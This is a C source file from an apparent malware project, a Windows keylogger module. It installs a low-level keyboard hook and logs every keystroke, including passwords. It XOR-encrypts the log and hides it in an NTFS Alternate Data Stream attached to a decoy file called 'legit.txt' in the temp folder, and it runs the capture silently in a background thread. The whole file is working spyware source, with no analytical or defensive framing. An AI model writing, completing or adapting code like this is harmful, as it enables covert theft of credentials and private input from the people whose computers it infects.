#include "malware.h"

// Keylogger state
HHOOK hHook = NULL;                   // Keyboard hook handle
DWORD logRotateInterval = 5000;        // Log rotation interval (ms)

// Keylogging buffers
char keylogBuffer[LOG_BUFFER_SIZE] = {0};  // Circular buffer
size_t keylogSize = 0;                     // Current buffer size
char encryptionKey = XOR_KEY;              // Current XOR key

// Convert virtual key code to descriptive string
const char* KeyToStr(DWORD vk) {
    switch (vk) {
        case VK_RETURN: return "[ENTER]\n";  // Enter key
        case VK_TAB: return "[TAB]";         // Tab key
        case VK_BACK: return "[BACKSPACE]";  // Backspace
        case VK_ESCAPE: return "[ESC]";      // Escape
        case VK_SPACE: return " ";           // Space
        case VK_SHIFT: return "[SHIFT]";     // Shift
        case VK_CONTROL: return "[CTRL]";    // Control
        case VK_MENU: return "[ALT]";        // Alt
        case VK_CAPITAL: return "[CAPSLOCK]"; // Caps Lock
        case VK_DELETE: return "[DEL]";      // Delete
        case VK_HOME: return "[HOME]";       // Home
        case VK_END: return "[END]";         // End
        default: return NULL;                // Not a special key
    }
}

// Initialise keylogger buffer
void InitKeyloggerBuffer() {
    memset(keylogBuffer, 0, LOG_BUFFER_SIZE);  // Clear buffer
    keylogSize = 0;                            // Reset size
    encryptionKey = XOR_KEY;                   // Reset XOR key
}

// Append string to keylog buffer
void AppendToKeylog(const char* str) {
    size_t len = strlen(str);
    
    // Rotate log if buffer full
    if (keylogSize + len >= LOG_BUFFER_SIZE) {
        EncryptAndRotateLog();
    }
    
    // Append to buffer
    memcpy(keylogBuffer + keylogSize, str, len);
    keylogSize += len;
}

// Encrypt and save log to Alternate Data Stream (ADS)
void EncryptAndRotateLog() {
    if (keylogSize == 0) return;  // Skip if empty
    
    // Use fixed key for each log file
    char tempKey = XOR_KEY;
    XORCrypt(keylogBuffer, keylogSize, &tempKey, TRUE);
    
    // Debug: print first 8 bytes
    printf("[ENCRYPT] Encrypted %zu bytes: ", keylogSize);
    for (size_t i = 0; i < (keylogSize > 8 ? 8 : keylogSize); i++) {
        printf("%02X ", (unsigned char)keylogBuffer[i]);
    }
    if (keylogSize > 8) printf("...");
    printf("\n");
    
    // Get temp directory
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    
    // Create base file path
    char baseFilePath[MAX_PATH];
    sprintf(baseFilePath, "%slegit.txt", tempPath);
    
    // Create base file if it doesn't exist
    HANDLE hBaseFile = CreateFileA(baseFilePath, GENERIC_WRITE, 
                                  FILE_SHARE_READ, NULL, OPEN_ALWAYS, 
                                  FILE_ATTRIBUTE_NORMAL, NULL);
    if (hBaseFile != INVALID_HANDLE_VALUE) {
        CloseHandle(hBaseFile);
    } else {
        printf("[ERROR] Failed to create base file: %d\n", GetLastError());
    }
    
    // Create ADS path: basefile:stream.log
    char currentLogPath[MAX_PATH];
    sprintf(currentLogPath, "%s:%s.log", baseFilePath, CLIENT_ID);
    
    // Write encrypted log to ADS
    HANDLE hFile = CreateFileA(currentLogPath, GENERIC_WRITE, 
                              FILE_SHARE_READ | FILE_SHARE_WRITE, 
                              NULL, CREATE_ALWAYS, 
                              FILE_ATTRIBUTE_NORMAL, NULL);
    
    if (hFile != INVALID_HANDLE_VALUE) {
        DWORD written;
        WriteFile(hFile, keylogBuffer, keylogSize, &written, NULL);
        CloseHandle(hFile);
        printf("[ENCRYPT] Log saved to ADS: %s\n", currentLogPath);
    } else {
        printf("[ERROR] Failed to write encrypted log to ADS: %d\n", GetLastError());
    }
    
    InitKeyloggerBuffer();  // Reset buffer
}

// Low-level keyboard hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    // Process keydown events
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT* kb = (KBDLLHOOKSTRUCT*)lParam;
        
        const char* str = KeyToStr(kb->vkCode);  // Get special key string
        char buffer[16] = {0};  // Key buffer
        
        if (str) {
            strcpy(buffer, str);  // Use special string
        } else {
            // Translate key to character
            BYTE keyboardState[256] = {0};
            GetKeyboardState(keyboardState);
            
            WORD result = 0;
            if (ToAscii(kb->vkCode, kb->scanCode, keyboardState, &result, 0) == 1) {
                buffer[0] = (char)result;  // Store character
            }
        }
        
        // Append to log if valid key
        if (buffer[0]) {
            AppendToKeylog(buffer);
        }
    }
    return CallNextHookEx(hHook, nCode, wParam, lParam);  // Pass to next hook
}

// Keylogger thread function
DWORD WINAPI KeyloggerThread(LPVOID lpParam) {
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);  // Get temp directory
    
    InitKeyloggerBuffer();  // Initialise buffer
    
    // Main keylogger loop
    while (running) {
        // Install hook if not installed
        if (!hHook) {
            hHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, 
                                    GetModuleHandle(NULL), 0);
            if (!hHook) {
                // Log error if hook fails
                DWORD err = GetLastError();
                char debugMsg[128];
                sprintf(debugMsg, "Keylogger hook error: %d", err);
                OutputDebugStringA(debugMsg);
                Sleep(logRotateInterval);
                continue;
            }
        }
        
        // Process messages for log rotation period
        DWORD startTime = GetTickCount();
        while (running && (GetTickCount() - startTime) < logRotateInterval) {
            MSG msg;
            // Process message queue
            while (PeekMessage(&msg, NULL, 0, 0, PM_REMOVE)) {
                TranslateMessage(&msg);
                DispatchMessage(&msg);
            }
            Sleep(100);  // Reduce CPU usage
        }
        
        EncryptAndRotateLog();  // Save current log
    }
    
    // Save any remaining data before exit
    if (keylogSize > 0) {
        EncryptAndRotateLog();
    }
    
    // Uninstall hook
    if (hHook) {
        UnhookWindowsHookEx(hHook);
        hHook = NULL;
    }
    
    return 0;  // Thread exit
}

// Start keylogger in separate thread
void StartKeylogger() {
    CreateThread(NULL, 0, KeyloggerThread, NULL, 0, NULL);
}